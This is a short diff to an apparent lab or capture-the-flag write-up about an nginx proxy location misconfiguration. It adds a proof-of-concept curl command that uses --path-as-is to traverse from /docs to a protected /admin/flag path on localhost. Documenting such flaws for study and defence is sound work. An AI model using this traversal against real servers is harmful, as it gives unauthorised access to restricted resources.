@@ -23,3 +23,8 @@ location /docs {
     proxy_pass	http://backend:8080/docs/;
 }
 ```
+
+### POC
+``` bash
+curl --path-as-is 'http://127.0.0.1:8082/docs../admin/flag'
+```
